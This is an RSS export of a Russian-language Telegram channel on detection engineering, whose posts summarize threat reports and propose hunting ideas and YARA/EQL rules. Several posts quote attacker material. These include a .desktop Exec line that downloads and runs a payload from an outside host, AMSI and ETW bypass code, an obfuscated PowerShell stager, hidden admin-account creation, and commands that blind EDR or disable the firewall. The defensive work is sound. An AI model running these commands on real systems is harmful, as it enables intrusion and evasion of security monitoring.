@@ -1,0 +1,1214 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Detection is easy</title><link>https://t.me/detectioneasy</link><description>Detections</description><language>ru</language><lastBuildDate>Wed, 29 Jul 2026 19:46:56 +0000</lastBuildDate><item><title>При проведении compromise assessment на Windows-машине в WORKGROUP сразу бросилась в глаза служба NSSM (Non-Sucking Service Manager). Она позволяет запускать приложения, как Windows-службы. Путь...</title><link>https://t.me/detectioneasy/331</link><description>Всем привет 💻✌️
+При проведении compromise assessment на Windows-машине в WORKGROUP сразу бросилась в глаза служба NSSM (Non-Sucking Service Manager). Она позволяет запускать приложения, как Windows-службы. Путь службы вел к %SystemDrive%\Programm Data\
+Оказалось, что это был DLP-агент, собранный через PyInstaller, а для запуска бинарника разработчики использовали NSSM 🤣
+Права на директорию, файлы и службу были настроены некорректно. В результате конфигурация создавала возможность для подмены исполняемого файла и повышения привилегий на хосте.
+p.s. вайбкодер бы такого не сделал 🔎
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Wed, 29 Jul 2026 19:46:56 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_331</guid></item><item><title>Коллеги из Инфотекс сообщают о возможной компрометации пользователей, путем эксплуатации механизма обновлений ViPNet Administrator</title><link>https://t.me/detectioneasy/330</link><description>Всем привет 💻✌️
+Коллеги из Инфотекс сообщают о возможной компрометации пользователей, путем эксплуатации механизма обновлений ViPNet Administrator
+Поделились yara-правилами для поиска известных модулей
+upd: https://ptsecurity.com/research/pt-esc-threat-intelligence/attack-via-the-vipnet-mftp-service-signs-of-compromise-and-recommendations/
+upd: https://kas.pr/5c9t
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Thu, 16 Jul 2026 16:25:17 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_330</guid></item><item><title>Коллеги из PT ESC разобрали кампанию CapFix, нацеленную на российские организации</title><link>https://t.me/detectioneasy/329</link><description>Всем привет 💻✌️
+Коллеги из PT ESC разобрали кампанию CapFix, нацеленную на российские организации
+👨‍💻 Как это работает?
+🔤Основный вектор получения доступа фишинг с PDF/HTML-приманками, которые побуждают скачать файл
+‍🔤В одной из цепочек внутри архива находился *.chm, который скачивал файл a.gif с скомпрометированного легитимного домена, переименовывал его в dmitry_medvedev.msi и открывал легитимный PDF-документ для отвлечения пользователя
+🔤*.msi был подписан QILING Tech и создавал директорию C:\Users\admin\AppData\Local\Disk Master с множеством dll-файлов, и уязвимым к DLL sideloading MetadataConvert.exe
+🔭 Обнаружение:
+🔤 ищем переименованные файлы (с неисполняемого расширения в исполняемое) в $mft и $UsnJrnl:$J, кластеризируем по критичности
+🔤 хантим бинарь с подписью QILING Tech
+🔤 отслеживаем цепочку процессов (пример правила из eql - execution_via_compiled_html_file)
+process where host.os.type == "windows" and event.type == "start" and
+process.parent.name : "hh.exe" and
+process.name : ("mshta.exe", "cmd.exe", "powershell.exe", "pwsh.exe", "powershell_ise.exe", "cscript.exe", "wscript.exe")
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Fri, 15 May 2026 04:27:42 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_329</guid></item><item><title>Ранее в новых ОС Windows при установке с нуля стали по умолчанию включать различные методы защиты от релей-атак, такие как EPA, SMB signing и LDAP-Channel Binding. Тем не менее, при апгрейде со...</title><link>https://t.me/detectioneasy/328</link><description>В Windows 11 версии 24H2 и Windows Server 2025 добавлены новая политика и события аудита NTLM. Расширенный аудит поддерживает улучшенный мониторинг безопасности и идентификацию устаревших зависимостей проверки подлинности NTLM.
+Ранее в новых ОС Windows при установке с нуля стали по умолчанию включать различные методы защиты от релей-атак, такие как EPA, SMB signing и LDAP-Channel Binding. Тем не менее, при апгрейде со старых версий ОС настройки будут оставаться прежние, и атаки будут работать.
+Поэтому обращаем внимание на новые события:
+— 4020 (Informational)
+— 4021 (Warning) "This machine attempted to authenticate to a remote resource via NTLM”
+— 4022 (Informational)
+— 4023 (Warning) “A remote client is using NTLM to authenticate to this workstation”
+Эти события можно использовать для детектирования coercing-атак либо для анализа  нетипичных  настроек NTLM-аутентификации.
+На скриншоте выше — как раз пример coercing-атаки: цепочка событий 4023 и 4021 с одного IP-адреса атакующего.
+
+[Media: Фото]</description><pubDate>Fri, 08 May 2026 09:49:21 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_328</guid></item><item><title>Автор статьи показал интересный способ доставки вредоносного ПО в обход предупреждений SmartScreen</title><link>https://t.me/detectioneasy/327</link><description>Всем привет 💻✌️
+Автор статьи показал интересный способ доставки вредоносного ПО в обход предупреждений SmartScreen
+👨‍💻  Как это работает?
+🔤Цепочка довольно простая: zip -&gt; vhdx -&gt; trust.exe + malicious.dll
+🔤 Пользователю доставляется архив, внутри которого находится образ диска VHDX
+🔤 После открытия и монтирования образа, жертва видит переименованный легитимный ApplicationFrameHost.exe и вредоносную библиотеку UMPDC.dll
+Автор использует исполняемый файл с доверенной репутацией, чтобы  обойти MotW
+🔭  Обнаружение:
+🔤 отслеживаем монтирование образов дисков VHD/VHDX/ISO/IMG
+🔤 отслеживаем запуск исполняемых файлов с примонтированных образов и съемных носителей
+🔤 отслеживаем загрузку неподписанных DLL рядом с системными файлами, расположенными в нетипичном пути
+🔤 отслеживаем запуск системных  файлов из пользовательских директорий, архивов, Temp и примонтированных образов
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Tue, 07 Apr 2026 14:06:45 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_327</guid></item><item><title>Тема с ярлыками остаётся актуальной и для некоторых дистрибутивов Linux. Эту технику использует группировка APT36</title><link>https://t.me/detectioneasy/326</link><description>Всем привет 💻✌️
+Тема с ярлыками остаётся актуальной и для некоторых дистрибутивов Linux. Эту технику использует группировка APT36
+.desktop — это launcher-файл, описанный в Desktop Entry Specification. Он используется desktop-environments для отображения приложений в меню и содержит параметр Exec, определяющий команду запуска.
+Пример файла из отчёта:
+[Desktop Entry]
+Name=Meeting_Ltr_ID15430ps.pdf
+Exec=bash -c 'tmp_file="/tmp/Meeting_Ltr_ID15430ps.pdf-$(date +%s)"; curl -s "https://securestore.cv/ghg/Mt_dated_29.txt" | xxd -r -p &gt; "$tmp_file" &amp;&amp; chmod +x "$tmp_file" &amp;&amp; "$tmp_file" &amp; firefox --new-window "https://drive.google.com/file/d/123"'
+Terminal=false
+Type=Application
+Icon=application-pdf
+Categories=Utility;
+X-GNOME-Autostart-enabled=true
+X-AppImage-Integrate=false
+Злоумышленники используют файлы .desktop для получения доступа к хосту в фишинговых кампаниях. Далее цепочка действий несильно отличается от атак на Windows: загрузка вредоносного файла, его запуск и отображение пользователю decoy-файла
+🔭 Обнаружение:
+🔤 отслеживаем создание или модификацию .desktop файлов в пользовательских каталогах
+🔤 хантим использование бинарей из gtfobins (bash, sh, python, curl, wget) в Exec
+rule Linux_Desktop_Suspicious_GTFOBins
+{
+meta:
+description = "Detect suspicious .desktop launcher executing shells or GTFOBins"
+author = "@detectioneasy"
+date = "2026-03-15"
+reference = "https://www.cyfirma.com/research/apt36-targets-indian-boss-linux-systems-with-weaponized-autostart-files/"
+strings:
+$desktop = "[Desktop Entry]" ascii nocase
+$exec = "Exec=" ascii nocase
+$sh = "sh -c" ascii nocase
+$pipe_sh = "| sh" ascii nocase
+$pipe_bash = "| bash" ascii nocase
+$pipe_zsh = "| zsh" ascii nocase
+$pipe_dash = "| dash" ascii nocase
+$curl = "curl " ascii nocase
+$wget = "wget " ascii nocase
+$tmp = "/tmp/" ascii nocase
+$cache = ".cache/" ascii nocase
+condition:
+$desktop and $exec and
+2 of (
+$sh,
+$pipe_sh,$pipe_bash,$pipe_zsh,$pipe_dash,
+$curl,$wget,$tmp,$cache
+)
+}
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Sun, 15 Mar 2026 15:22:20 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_326</guid></item><item><title>Группа APT-36 собирает необычные .lnk файлы размером более 2 MB, которые содержат PDF-структуры</title><link>https://t.me/detectioneasy/325</link><description>Всем привет 💻✌️
+Группа APT-36 собирает необычные .lnk файлы размером более 2 MB, которые содержат PDF-структуры
+Анализ показал, что злоумышленники встраивают объекты stream, endobj, изображения и другие структуры PDF. Это делает файл похожим на настоящий документ и увеличивает его размер
+🔭 Обнаружение:
+🔤 хантим LNK файлы с большим объемом (обычный вес 10–12 KB)
+rule Suspicious_LNK_Large_File
+{
+meta:
+description = "Detect unusually large Windows shortcut files &gt;200KB"
+author = "@detectioneasy"
+date = "2026-03-12"
+reference = "Malware often abuses oversized LNK files to embed payloads https://www.cyfirma.com/research/apt36-multi-stage-lnk-malware-campaign-targeting-indian-government-entities/"
+strings:
+$lnk_magic = {4C 00 00 00 01 14 02 00}
+condition:
+$lnk_magic at 0 and
+filesize &gt; 200KB
+}
+🔤 отслеживаем создание LNK файлов, процессами архиваторов
+🔤 отслеживаем LNK-файлы с альтернативным потоком
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Thu, 12 Mar 2026 20:11:19 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_325</guid></item><item><title>Коллеги из ЛК подсветили изменения в TTP Librarian Likho</title><link>https://t.me/detectioneasy/324</link><description>Всем привет 💻✌️
+Коллеги из ЛК подсветили изменения в TTP Librarian Likho
+👨‍💻 Как это работает?
+🔤 Атакующие не утруждаются и фишат исполняемыми файлами *.com, что может говорить об отсутствии защиты почты у их жертв...
+🔤 Исполняемый файл - это инсталлятор собранный через Smart Install Maker
+🔤 После запуска создаются два cab-архива, мимикрирующие под временные файлы -  2.tmp и temp_0.tmp, по пути Users\[REDACTED]\AppData\Local\Temp\$inst
+🔤 Из их архивов извлекаются файлы - приманка, текстовый файл со списком адресов, curl и два bat-скрипта
+🔤 Далее, запускается decoy-файл и скрипт find.cmd
+🔤 Скрипт получает список C2-серверов и загружает архивы и кастомную версию WinRAR с захардкоженным паролем. После чего, распаковывает архивы в Users\[REDACTED]\AppData\Roaming\Windows. Файлы из архивов:
+blat.exe - Утилита для эксфильтрации данных через SMTP
+AnyDesk.exe - Утилита для удаленного управления хостом
+Trays.exe - Утилита для сокрытия окон запущенных процессов
+wbpv.exe  - Утилита WebBrowserPassView для восстановления паролей, сохраненных в веб-браузерах
+dc.exe - Утилита для отключения Windows Defender
+mlpv.exe - Утилита для восстановления паролей с почтовых клиентов
+bat.bat - Скрипт для эксфильтрации паролей и обхода средств защиты информации
+🔤 Механизмы защиты отключаются остановкой или удалением служб WinDefend и MpsSvc, и профилей брандмауэра
+netsh advfirewall set allprofiles state off
+🔤 Для закрепления используется служба AnyDesk
+echo qqqq | AnyDesk.exe —set-password _unattended_access
+🔤Завершающий этап - это сбор паролей из браузеров, почтовых клиентов и их эксфильтрация
+🔭 Обнаружение:
+🔤 отслеживаем создание исполняемых файлов браузерами и почтовыми клиентами
+🔤 отслеживаем родительскую цепочку для офисных процессов, обычно это explorer.exe, outlook.exe, chrome, firefox.exe, browser.exe и другие, нужно профилировать
+или родительский исполняемый файл из Temp, Downloads
+🔤 отслеживаем smtp трафик с пользовательских хостов, на сторонние сервера
+🔤 отслеживаем остановку служб средств защиты
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Sat, 28 Feb 2026 11:09:33 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_324</guid></item><item><title>Elastic Security Labs разобрали кампанию ClickFix, которая заканчивается установкой кастомного RAT MIMICRAT</title><link>https://t.me/detectioneasy/323</link><description>Всем привет 💻✌️
+Elastic Security Labs разобрали кампанию ClickFix, которая заканчивается установкой кастомного RAT MIMICRAT
+По цепочке видно высокий уровень OPSEC: компрометация легитимных сайтов как инфраструктуры доставки, многоступенчатый PowerShell, затем bypass ETW + AMSI, после чего дропается Lua-лоадер, исполняющий шеллкод в памяти
+👨‍💻 Как это работает?
+🔤 доставка осуществляется через ClickFix, в результате которого выполняется обфусцированный Stage 1 — PowerShell-скрипт
+powershell.exe -WInDo Min $RdLU='aZmEwGEtHPckKyBXPxMRi.neTwOrkicsGf';$OnRa=($RdLU.Substring(17,12));$jOFn=.($RdLU[(87)/(3)]+$RdLU[19]+$RdLU[2]) $OnRa;$TNNt=$jOFn; .($TNNt.Remove(0,3).Remove(3))($TNNt);
+🔤 Stage 2 - загруженный скрипт обфусцирован арифметическими операциями
+$smaau = (-join[char[]](((7454404997-7439813680)/175799),(91873122/759282),...))
+🔤 ETW Bypass путем изменения .NET класса
+[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+🔤 AMSI Bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+🔤 AMSI - Memory Patching. После отключения обнаружения в %ProgramData%/knz_{random} дропнут архив с Lua loader
+$ScanContent_func = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetMethods("NonPublic,Static") | Where-Object Name -eq "ScanContent"
+$tttttttttt       = [zsZRXVIIMQvZ].GetMethods() | Where-Object Name -eq "FHVcGSwOEM"
+[System.Runtime.InteropServices.Marshal]::Copy( @([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$tttttttttt.MethodHandle.Value + [long]8)),
+0,
+[long]$ScanContent_func.MethodHandle.Value + [long]8,
+1
+)
+🔤 доставка Lua loader
+$extractTo = Join-Path $env:ProgramData ("knz_{0}" -f ([IO.Path]::GetRandomFileName()))
+[IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $extractTo)
+Start-Process (Join-Path $extractTo 'zbuild.exe')
+🔭 Обнаружение:
+🔤 запуск PowerShell в минимальном режиме powershell.exe -WInDo Min
+🔤 отслеживание длинных символьных последовательностей в логах PowerShell
+🔤 в логах PowerShell Reflection.Assembly, System.Diagnostics.Eventing.EventProvider, PSEtwLogProvider, System.Management.Automation.AmsiUtils, GetRandomFileName, IO.Compression.ZipFile, -join [char[]]
+🔤 создание файлов exe,zip в %ProgramData%
+p.s. детекты от elastic:
+Execution via Obfuscated PowerShell Script
+DNS Query to Suspicious Top Level Domain
+Suspicious Command Shell Execution via Windows Run
+Token theft and impersonation
+Potential Privilege Escalation via Token Impersonation
+Shellcode Execution from Low Reputation Module
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Thu, 26 Feb 2026 06:34:44 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_323</guid></item><item><title>Message 322</title><link>https://t.me/detectioneasy/322</link><description>
+
+[Media: Фото]</description><pubDate>Mon, 23 Feb 2026 08:08:20 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_322</guid></item><item><title>Разбирем PhantomProxyLite группы Head Mare, по исследованию ЛК</title><link>https://t.me/detectioneasy/321</link><description>Всем привет 💻✌️
+Разбирем PhantomProxyLite группы Head Mare, по исследованию ЛК
+👨‍💻 Как это работает?
+🔤 в ранних кампаниях PhantomProxyLite был бинарником, который работал как фоновый сервис с именем SSHService и поднимал обратный SSH-туннель к C2
+🔤 в новой кампании инструмент переписали на PowerShell: закрепление теперь делается через задачу Планировщика с тем же именем SSHService, запуск при старте системы от имени SYSTEM
+🔤 функционал закрепления - создание SSH-туннеля. Параметры для запуска хранятся в ключе HKLM\SOFTWARE\SSHService
+❗️В исследовании не уточняется, какой сервис прокидывали через SSH-туннель, поэтому в качестве наиболее вероятного сценария будем рассматривать RDP
+🔭 Обнаружение:
+🔤 создание задачи и службы с именем SSHService. Можем похантить задачи с powershell
+🔤 исходящие сессии (sysmon 3, security 5156) на порт 22. При наличии IDS,NTA исходящие ssh соединения
+🔤 отслеживаем запуск нативного ssh клиента C:\Windows\System32\OpenSSH\ssh.exe
+🔤 RDP-сесиию из туннеля мы можем увидеть в логах Microsoft-Windows-TerminalServices-LocalSessionManager/Operational AND EventId=24 AND Address contains ::%16777216
+а также
+Microsoft-Windows-TerminalServices-RemoteConnectionManager/Admin AND EventId=1158 AND Param1=::%16777216
+🔤 аномалией может стать Security AND EventID=5156 AND SourceAddress contains ::1 and DestAddress contains ::1 and DestPort=3389
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Sun, 22 Feb 2026 13:08:35 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_321</guid></item><item><title>Коллеги PT ESC раскрыли техники, используемые для распространения LuciDoor и MarsSnake.</title><link>https://t.me/detectioneasy/320</link><description>Всем привет 💻✌️
+Коллеги PT ESC раскрыли техники, используемые для распространения LuciDoor и MarsSnake.
+👨‍💻 Как это работает?
+🔤 как правило, атака начинается с фишинга, в рамках которого доставляется файл .doc с макросом. Содержимое документа побуждает пользователя нажать Включить содержимое
+🔤 закреп через задачу. Путь к сохраняемому бинарному файлу зависит от прав пользователя
+обычный пользователь — %AppData%
+администратор — %ProgramData%\Microsoft OneDrive\setup\
+🔤 используемые злоумышленниками библиотеки маскируются под легитимные файлы Windows (заполняются поля описания и метаданные)
+🔤 использование утилиты ftp для запуска команд - FTPlnk_phishing
+🔭 Обнаружение:
+🔤 мониторинг запуска ftp.exe -::s: и анализ дочерних процессов ftp.exe
+🔤 поиск файлов с описанием, содержащим Windows или Microsoft, и отсутствующей/невалидной  подписью
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Thu, 19 Feb 2026 17:37:08 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_320</guid></item><item><title>ClickFix уже многим успел надоесть, однако атакующие продолжают активно продвигать этот метод</title><link>https://t.me/detectioneasy/318</link><description>Всем привет! 💻✌️
+ClickFix уже многим успел надоесть, однако атакующие продолжают активно продвигать этот метод
+Кто-то ещё не заблокировал запуск окна Выполнить ⌨️
+👨‍💻 Как это работает?
+Атакующие резолвят определенный домен через подконтрольные DNS сервера. Ответ сервера парсится и передается на выполнение LOLBins
+🔭 Обнаружение:
+🔤 отключаем Выполнить
+🔤 хантим RunMRU и мониторим создание новых ключей
+🔤 разрешаем подключение только к доверенным DNS-серверам
+🔤 хантим DNS-ответы
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото]</description><pubDate>Wed, 18 Feb 2026 09:00:01 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_318</guid></item><item><title>Cisco Talos опубликовали отчет о TTP группировки UAT-8099</title><link>https://t.me/detectioneasy/317</link><description>Всем привет! 💻✌️
+Cisco Talos опубликовали отчет о TTP группировки UAT-8099
+👨‍💻 Как это работает?
+🔤 После получения доступа выполняют команды для анализа хоста - whoami, tasklist
+🔤 Для закрепления устанавливают SoftEther VPN и создают учетную запись, маскирующуюся под сервисную, mssql$ (в дальнейшем логин менялся, однако IOA оставался тем же)
+cmd /c net user mssql$ AppleHuitar7$ /add
+cmd /c net localgroup administrators mssql$ /add
+cmd /c net user mssql$ /expires:never
+🔤 Один из инструментов атакующих - GotoHTTP
+Загружают через PowerShell Invoke-WebRequest https://.*/*.vbs
+и запускают cmd /c C:\Users\Public\zcgo1.vbs
+🔤 Конечная цель атакующих — внедрение кода в IIS
+🔭 Обнаружение:
+🔤 отслеживаем запуск whoami и net user|localgroup
+🔤 хантим и отслеживаем создание пользовательских учетных записей с последним символом $
+🔤 отслеживаем EventId=4624 and LogonType in [3, 10] and TargetUserName endswith $
+🔤 мониторим использование RMM Tool
+🔤 отслеживаем запуск дочерних процессов (cmd.exe, powershell.exe, etc) от родителя w3wp.exe
+🔤 отслеживаем создание новых *.aspx
+🔤 создание странных файлов в C:\Users\Public
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Tue, 17 Feb 2026 18:31:04 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_317</guid></item><item><title>После месячной раскачки — возвращаемся к практике</title><link>https://t.me/detectioneasy/316</link><description>Всем привет! 💻✌️
+После месячной раскачки — возвращаемся к практике
+Начнем с отчета о действиях группировки APT-Q-27
+❗️Атакующие используют непривычные расширения exe или scr, а расширение pif
+У большинства жертв в Windows скрыто отображение расширений файлов. В результате Проводник показывает только имя файла, и pif выглядит менее подозрительно
+👨‍💻 Как это работает?
+🔤 Пользователь получает ссылку на файл вида hxxps://storage[.]googleapis[.]com/iwantuu/photo202512.pif#image2025-12-29-14-53.jpg
+Для отвода внимания жертвы в конце URL установлен идентификатор фрагмента #image2025-12-29-14-53.jpg
+🔤 По ссылке загружается дропер с расширением .pif
+🔤 После запуска он получает список адресов для загрузки остальных шагов из файла
+hxxps://yyupdats[.]s3.ap-southeast-1.amazonaws.com/updat.txt
+🔤 Далее TTP мимикрируют под процесс обновления Windows
+Файлы сохраняются в каталог C:\Users\Admin\AppData\Local\\Microsoft\WindowsUpdate\\Cache\WU_20251230_67e65f7b@27 и ему устанавливаются атрибуты Hidden и NotContentIndexed
+Используется файл updat.exe - (64B07B1C385CF94A3559E323009F7641) легитимный файл, который нужен для детонации полезной нагрузки из crashreport.dll
+🔤Вредонос закрепляется в ключе HKCU\Software\Microsoft\Windows\CurrentVersion\Run текущего пользователя
+🔤Далее происходит распаковка backdoor из файла, который создает службу с именем Windows EventN. Путь к запускаемому файлу C:\\Users\\&lt;User&gt;\\Videos\\&lt;random_string&gt;@27
+🔤Отключается UAC, путем изменения ключей реестра HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\{EnableLUA, ConsentPromptBehaviorAdmin, PromptOnSecureDesktop}
+🔭 Обнаружение:
+🔤 отслеживаем создание файлов и создание процессов с расширением pif
+🔤 хантим наличие директорий с @ в имени
+🔤 хантим наличие директорий с атрибутом Hidden и/или NotContentIndexed
+🔤 отслеживаем и хантим наличие служб с исполняемым файлом в пользовательских директориях
+🔤 отслеживаем и хантим изменение ключей реестра UAC
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Mon, 16 Feb 2026 18:27:18 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_316</guid></item><item><title>#Blue_Team_Techniques</title><link>https://t.me/detectioneasy/315</link><description>#Infographics
+#Blue_Team_Techniques
+"Detection Engineering Cheatsheet", SANS 2026.
+// This poster provides a practical, end-to-end view of Detection Engineering, guiding defenders from raw log data to meaningful alerts
+
+[Media: Документ]</description><pubDate>Thu, 12 Feb 2026 09:12:22 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_315</guid></item><item><title>Давайте рассмотрим интересные техники из отчёта о ClickFix</title><link>https://t.me/detectioneasy/314</link><description>Всем привет! 💻✌️
+Давайте рассмотрим интересные техники из отчёта о ClickFix
+🔤 Для хранения полезной нагрузки используется смарт-контракт BNB Smart Chain. JavaScript загружает данные из смарт-контракта и передаёт их в eval(atob(*)). Способ хранения малвари в  смарт-контрактах известен как EtherHiding
+🔤Злоумышленники не используют чистый  запуск cmd, mshta, или powershell. Вместо этого они перешли на LoTL-технику с использованием  SyncAppvPublishingServer.vbs
+🔭 Обнаружение:
+🔤 можем отслеживать наличие в аргументах командной строки \SyncAppvPublishingServer.vbs и ;
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Fri, 30 Jan 2026 06:40:48 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_314</guid></item><item><title>Выглядит интересно ⁉️ https://github.com/MHaggis/Security-Detections-MCP/tree/main</title><link>https://t.me/detectioneasy/312</link><description>Всем привет! 💻✌️
+Выглядит интересно ⁉️ https://github.com/MHaggis/Security-Detections-MCP/tree/main
+🔤 Единый поиск по правилам
+🔤 Быстрый ответ на вопрос «**что у меня уже есть для детекта этой атаки?**»
+🔤 Анализ покрытия. Показывает, какие техники ATT&amp;CK закрыты
+🔤 Генерация идей для новых детектов по недостающим техникам
+Пока не тестил, но в беклоге лежал такой проект и под него копились разные правила и репозитории...)
+Мой MCP был такой grep -Eri &lt;regexp&gt; &lt;repos_path&gt;
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Sat, 17 Jan 2026 18:39:10 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_312</guid></item><item><title>ipurple собрали в одну статью способы нарушения канала связи средств обнаружения базовыми возможностями Windows</title><link>https://t.me/detectioneasy/311</link><description>Всем привет! 💻✌️
+ipurple собрали в одну статью способы нарушения канала связи средств обнаружения базовыми возможностями Windows
+🔤 Использование windows filtering platform
+🔤 Файл hosts
+Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "127.0.0.1 edr.domain.com"
+Add-Content -Path "C:\Windows\System32\drivers\etc\hosts.ics" -Value "127.0.0.1 edr.domain.com"
+🔤 Изменение таблицы маршрутизации
+Get-NetIPInterface
+New-NetRoute -DestinationPrefix "192.168.100.0/32" -InterfaceIndex 1 -PolicyStore ActiveStore
+🔤 Изменение Name Resolution Policy Table
+Add-DnsClientNrptRule -Namespace ".endpoint.security.microsoft.com" -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"
+Add-DnsClientNrptRule -Namespace "endpoint.security.microsoft.com" -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"
+Clear-DnsClientCache
+🔤 Правила фильтрации IPSec
+netsh ipsec static add policy name=ipurplePolicy description=ipurplePolicy
+netsh ipsec static set policy name=ipurplePolicy assign=y
+netsh ipsec static add filteraction name=BlockFilterAction action=block
+netsh ipsec static add rule name=BlockRule policy=ipurplePolicy filterlist=BlockFilterList
+🔤 Secondary IP Addresses. Интересный способ - назначать IP-адреса серверов управления EDR на локальный интерфейс хоста
+🔭 Обнаружение пошагово рассмотрено в статье со скринами
+p.s. хантим адреса и доменные имена наших серверов управления в артефактах сетевой подсистемы Windows и в откинутых сетевых соединениях)
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Fri, 16 Jan 2026 09:24:58 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_311</guid></item><item><title>Всем привет! 💻✌️  Многие правила обнаружения строятся на событиях ключей реестра в HKCU, которые формируются на основе данных от callback - CmRegisterCallbackEx  При этом в Windows существует...</title><link>https://t.me/detectioneasy/310</link><description>Всем привет! 💻✌️  Многие правила обнаружения строятся на событиях ключей реестра в HKCU, которые формируются на основе данных от callback - CmRegisterCallbackEx  При этом в Windows существует механизм обязательных (mandatory) пользовательских профилей, который…
+
+[Media: Фото]</description><pubDate>Sat, 10 Jan 2026 06:23:58 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_310</guid></item><item><title>Многие правила обнаружения строятся на событиях ключей реестра в HKCU, которые формируются на основе данных от callback - CmRegisterCallbackEx</title><link>https://t.me/detectioneasy/309</link><description>Всем привет! 💻✌️
+Многие правила обнаружения строятся на событиях ключей реестра в HKCU, которые формируются на основе данных от callback - CmRegisterCallbackEx
+При этом в Windows существует механизм обязательных (mandatory) пользовательских профилей, который может быть использован атакующим в качестве закрепа
+👨‍💻 Как это работает?
+Профили пользователей становятся обязательными, когда администратор переименовывает файл NTUSER.dat в NTUSER.man. Расширение .man делает профиль пользователя доступным только для чтения и имеет высший приоритет
+При входе пользователя в систему загрузится профиль из файла NTUSER.MAN - никаких операций записи в реестр не происходит
+Атакующим нужно подготовить профиль пользователя с изменными ключами реестра
+🔭 Обнаружение:
+🔤 отслеживанием создание файлов NTUSER.MAN в %USERPROFILE%
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Sun, 04 Jan 2026 06:02:01 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_309</guid></item><item><title>С наступающим Новым годом!</title><link>https://t.me/detectioneasy/308</link><description>Всем привет! 💻✌️
+С наступающим Новым годом!
+Канал создавался как место для обмена информацией об обнаружении: практическими наблюдениями, идеями, рабочими и нерабочими подходами. Не было цели собирать аудиторию и без ожиданий по росту. Тем не менее, за этот год количество подписчиков оказалось неожиданным — и это хороший сигнал, что тема detection по-прежнему востребована
+В 2026-м желаем всем:
+✔️ Всегда True Positive
+🙅‍♂️ А False Negative у нас не бывает 💩
+Пусть детекты будут простыми, воспроизводимыми и объяснимыми
+Логи — полными, а use case — проверяемыми
+Спасибо всем, кто читает и использует материалы в работе!)
+#detection@detectioneasy
+
+[Media: Фото]</description><pubDate>Wed, 31 Dec 2025 18:18:17 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_308</guid></item><item><title>Интересный LPE, но что нам с этим делать?</title><link>https://t.me/detectioneasy/306</link><description>Всем привет! 💻✌️
+Интересный LPE, но что нам с этим делать?
+🔭 Обнаружение:
+🔤 утилита zabbix_get, как правило используется с сервера zabbix, который в большинстве своем развернут на Linux. Построим на этом детект
+ProviderName="Microsoft-Windows-Sysmon" and EventId=1 and (Image endswith: '\zabbix_get.exe' or Description = "zabbix_sender.exe")
+p.s. хосты админов могут фолсить
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Tue, 23 Dec 2025 12:33:09 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_306</guid></item><item><title>Атакующие загружали вредоносные расширения в браузер для кражи данных</title><link>https://t.me/detectioneasy/305</link><description>Всем привет! 💻✌️
+Атакующие загружали вредоносные расширения в браузер для кражи данных
+👨‍💻 Как это работает?
+В Chromium-based браузерах ранее поддерживался аргумент командной строки --load-extension, который позволял запускать браузер с указанием пути к расширению
+Позднее данный аргумент был скрыт, однако его всё ещё можно было использовать, если отключить соответствующее ограничение с помощью флага:
+--disable-features=DisableLoadExtensionCommandLineSwitch
+Таким образом, атакующие могли перезапускать Chrome или Edge с уже загруженным вредоносным расширением без необходимости установки через официальный магазин
+В актуальных версиях Chromium данный способ уже не работает
+🔭 Обнаружение:
+🔤 Хантим аргументы командной строки
